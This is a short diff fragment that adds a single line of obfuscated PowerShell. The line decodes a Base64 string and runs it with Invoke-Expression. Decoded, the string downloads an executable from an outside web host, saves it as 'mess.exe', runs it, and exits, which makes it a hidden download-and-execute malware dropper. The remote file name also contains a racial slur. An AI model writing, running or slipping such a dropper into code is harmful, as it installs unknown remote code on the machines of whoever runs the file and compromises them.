@@ -1,0 +1,2 @@
+iex([sYSTEM.text.EncOdINg]::Utf8.geTSTrINg([sYSTEM.CoNvErT]::fromBaSE64StriNg('CihOZXctT2JqZWN0IHNZc3RlbS5uRXQud2ViQ2xJRU5UKS5kb3dObG9BZEZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vbmlnZ2EuZXhlJywnbWVzcy5leGUnKTtTdGFydC1Qcm9jZXNzICdtZXNzLmV4ZScKCg==')));exit
+
